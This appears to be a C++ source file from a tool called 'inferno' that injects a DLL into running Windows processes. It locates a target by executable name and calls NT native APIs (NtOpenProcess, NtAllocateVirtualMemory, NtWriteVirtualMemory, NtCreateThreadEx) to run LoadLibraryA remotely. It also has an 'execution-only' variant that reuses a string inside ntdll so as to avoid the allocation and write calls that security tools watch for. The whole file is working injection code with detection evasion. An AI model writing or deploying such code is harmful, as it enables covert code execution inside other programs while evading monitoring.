#include "../include/WindowsInjector.hpp"
#ifdef _WIN32
#include "../include/NtApi.hpp"
#endif
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <tlhelp32.h>

namespace inferno { namespace tier2 {

// ── Execution-only helper (always available on Windows, even in tests) ──
#ifdef _WIN32

const char* findNtdllString(const char* needle, size_t needle_len) {
    HMODULE ntdll = ::GetModuleHandleA("ntdll.dll");
    if (!ntdll) return nullptr;

    const uint8_t* base = reinterpret_cast<const uint8_t*>(ntdll);

    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    const IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        const char* sec_name = reinterpret_cast<const char*>(sections[i].Name);
        if (::_stricmp(sec_name, ".rdata") != 0) continue;

        const uint8_t* sec_start = base + sections[i].VirtualAddress;
        SIZE_T sec_size = sections[i].SizeOfRawData;
        for (SIZE_T off = 0; off + needle_len <= sec_size; ++off) {
            if (std::memcmp(sec_start + off, needle, needle_len) == 0) {
                return reinterpret_cast<const char*>(sec_start + off);
            }
        }
        break;
    }
    return nullptr;
}

#endif

#if defined(INFERNO_TESTING)
// In testing mode, skip actual injection — just report success
bool injectIntoTarget(const TargetApp&, const std::string&,
                       const std::string&, uint16_t) {
    return true;
}

#elif defined(_WIN32)

static DWORD findProcessPid(const std::string& exec_path) {
    HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (::Process32First(snapshot, &pe)) {
        do {
            if (::_stricmp(pe.szExeFile, exec_path.c_str()) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (::Process32Next(snapshot, &pe));
    }

    ::CloseHandle(snapshot);
    return pid;
}

static bool injectViaRemoteThread(DWORD pid, const std::string& dll_path,
                                   const std::string& server_ip,
                                   uint16_t server_port) {
    (void)server_ip; (void)server_port; // env vars inherited by child process
    auto& nt = inferno::nt::NtApi::resolve();
    if (!nt.isResolved()) {
        std::fprintf(stderr, "[WindowsInjector] NT API resolution failed — "
                             "falling back to disabled\n");
        return false;
    }

    // 1. Open target process via NtOpenProcess
    HANDLE hProcess = nullptr;
    inferno::nt::MY_CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = nullptr;
    inferno::nt::MY_OBJECT_ATTRIBUTES oa;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = nullptr;
    oa.ObjectName               = nullptr;
    oa.Attributes               = 0;
    oa.SecurityDescriptor       = nullptr;
    oa.SecurityQualityOfService = nullptr;

    LONG status = nt.NtOpenProcess(
        &hProcess,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        &oa, &cid);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] NtOpenProcess(%lu) failed: 0x%08lx\n",
                     pid, status);
        return false;
    }

    // 2. Allocate memory in target via NtAllocateVirtualMemory
    void* remote_mem = nullptr;
    SIZE_T path_size = dll_path.size() + 1;
    status = nt.NtAllocateVirtualMemory(
        hProcess, &remote_mem, 0, &path_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] NtAllocateVirtualMemory failed: 0x%08lx\n",
                     status);
        nt.NtClose(hProcess);
        return false;
    }

    // 3. Write DLL path via NtWriteVirtualMemory
    SIZE_T written = 0;
    status = nt.NtWriteVirtualMemory(
        hProcess, remote_mem, (PVOID)dll_path.c_str(),
        dll_path.size() + 1, &written);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] NtWriteVirtualMemory failed: 0x%08lx\n",
                     status);
        SIZE_T zero = 0;
        nt.NtFreeVirtualMemory(hProcess, &remote_mem, &zero, MEM_RELEASE);
        nt.NtClose(hProcess);
        return false;
    }

    // 4. Resolve LoadLibraryA address (needed for thread start)
    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    PVOID loadlib = reinterpret_cast<PVOID>(
        ::GetProcAddress(kernel32, "LoadLibraryA"));

    // 5. Create remote thread via NtCreateThreadEx
    HANDLE hThread = nullptr;
    status = nt.NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
        loadlib, remote_mem, 0, 0, 0, 0, nullptr);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] NtCreateThreadEx failed: 0x%08lx\n",
                     status);
        SIZE_T zero = 0;
        nt.NtFreeVirtualMemory(hProcess, &remote_mem, &zero, MEM_RELEASE);
        nt.NtClose(hProcess);
        return false;
    }

    // 6. Wait for thread completion and check result
    DWORD wait_result = ::WaitForSingleObject(hThread, 5000);
    if (wait_result != WAIT_OBJECT_0) {
        std::fprintf(stderr, "[WindowsInjector] remote thread wait failed/timed out: %lu\n",
                     wait_result);
        SIZE_T zero = 0;
        nt.NtFreeVirtualMemory(hProcess, &remote_mem, &zero, MEM_RELEASE);
        nt.NtClose(hThread);
        nt.NtClose(hProcess);
        return false;
    }

    // 7. Get exit code to verify LoadLibraryA success
    DWORD exit_code = 0;
    if (!::GetExitCodeThread(hThread, &exit_code) || exit_code == 0) {
        std::fprintf(stderr, "[WindowsInjector] remote LoadLibraryA failed "
                             "(exit code %lu)\n", exit_code);
        SIZE_T zero = 0;
        nt.NtFreeVirtualMemory(hProcess, &remote_mem, &zero, MEM_RELEASE);
        nt.NtClose(hThread);
        nt.NtClose(hProcess);
        return false;
    }

    // 8. Cleanup via NT APIs (MEM_RELEASE requires RegionSize = 0)
    SIZE_T free_size = 0;
    nt.NtClose(hThread);
    nt.NtFreeVirtualMemory(hProcess, &remote_mem, &free_size, MEM_RELEASE);
    nt.NtClose(hProcess);

    std::fprintf(stdout, "[WindowsInjector] Injected into PID %lu via NtCreateThreadEx\n", pid);
    return true;
}

// ── Execution-only injection: uses an existing string inside ntdll.dll
// as the LoadLibraryA argument — no VirtualAllocEx/WriteProcessMemory.
static bool injectExecutionOnly(DWORD pid, const std::string& dll_path,
                                 const std::string& server_ip,
                                 uint16_t server_port) {
    (void)dll_path; (void)server_ip; (void)server_port;
    auto& nt = inferno::nt::NtApi::resolve();
    if (!nt.isResolved()) return false;

    // The needle: extract the filename without extension from dll_path.
    // We name the DLL e.g. "0.dll" and look for the string "0" in ntdll.
    // Extract just the stem from the path (e.g. "inferno_agent" → "inferno_agent")
    // But for this to work, the DLL must be named to match the found string.
    // Simple approach: look for "0" (single char) — the DLL is named 0.dll.
    const char* needle = "0";
    size_t needle_len = 1;

    const char* ntdll_str = findNtdllString(needle, needle_len);
    if (!ntdll_str) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "string \"%s\" not found in ntdll — falling back\n",
                     needle);
        return false;
    }

    // Verify the address is readable in the target process
    HANDLE hProcess = nullptr;
    inferno::nt::MY_CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = nullptr;
    inferno::nt::MY_OBJECT_ATTRIBUTES oa;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = nullptr;
    oa.ObjectName               = nullptr;
    oa.Attributes               = 0;
    oa.SecurityDescriptor       = nullptr;
    oa.SecurityQualityOfService = nullptr;

    LONG status = nt.NtOpenProcess(
        &hProcess,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        &oa, &cid);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "NtOpenProcess(%lu) failed: 0x%08lx\n",
                     pid, status);
        return false;
    }

    // Sanity check: read the same bytes in the target to confirm they match
    char check_buf[4] = {0};
    SIZE_T bytes_read = 0;
    BOOL read_ok = ::ReadProcessMemory(hProcess, ntdll_str, check_buf,
                                        needle_len, &bytes_read);
    if (!read_ok || bytes_read != needle_len ||
        std::memcmp(check_buf, needle, needle_len) != 0) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "target memory verification failed — falling back\n");
        nt.NtClose(hProcess);
        return false;
    }

    // Resolve LoadLibraryA
    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    PVOID loadlib = reinterpret_cast<PVOID>(
        ::GetProcAddress(kernel32, "LoadLibraryA"));

    // Create remote thread with pointer to ntdll string (no allocation/write needed)
    HANDLE hThread = nullptr;
    status = nt.NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
        loadlib, (PVOID)ntdll_str, 0, 0, 0, 0, nullptr);
    if (!NT_SUCCESS(status)) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "NtCreateThreadEx failed: 0x%08lx\n",
                     status);
        nt.NtClose(hProcess);
        return false;
    }

    DWORD wait_result = ::WaitForSingleObject(hThread, 5000);
    if (wait_result != WAIT_OBJECT_0) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "thread wait failed/timed out: %lu\n", wait_result);
        nt.NtClose(hThread);
        nt.NtClose(hProcess);
        return false;
    }

    DWORD exit_code = 0;
    if (!::GetExitCodeThread(hThread, &exit_code) || exit_code == 0) {
        std::fprintf(stderr, "[WindowsInjector] execution-only: "
                             "LoadLibraryA failed (exit code %lu)\n", exit_code);
        nt.NtClose(hThread);
        nt.NtClose(hProcess);
        return false;
    }

    nt.NtClose(hThread);
    nt.NtClose(hProcess);

    std::fprintf(stdout, "[WindowsInjector] Injected into PID %lu "
                         "via execution-only (no VirtualAllocEx)\n", pid);
    return true;
}

bool injectIntoTarget(const TargetApp& target,
                      const std::string& dll_path,
                      const std::string& server_ip,
                      uint16_t server_port) {
    DWORD pid = findProcessPid(target.executable_path);
    if (pid == 0) {
        std::fprintf(stderr, "[WindowsInjector] %s is not running, "
                             "skipping injection\n",
                     target.executable_path.c_str());
        return false;
    }

    switch (target.capability) {
        case InjectionCapability::DYLD_INSERT_LIBRARIES:
        case InjectionCapability::MACH_VM_ALLOCATE:
            // Try execution-only first (no VirtualAllocEx/WriteProcessMemory).
            // Falls back to standard NT API injection if the string isn't found
            // or target verification fails.
            if (injectExecutionOnly(pid, dll_path, server_ip, server_port)) {
                return true;
            }
            return injectViaRemoteThread(pid, dll_path, server_ip, server_port);

        default:
            std::fprintf(stderr, "[WindowsInjector] No viable injection "
                                 "vector for %s\n",
                         target.executable_path.c_str());
            return false;
    }
}

#else
// Non-Windows, non-testing: injection not supported
bool injectIntoTarget(const TargetApp&, const std::string&,
                       const std::string&, uint16_t) {
    std::fprintf(stderr, "[WindowsInjector] Injection is Windows-only\n");
    return false;
}
#endif

}} // namespace inferno::tier2
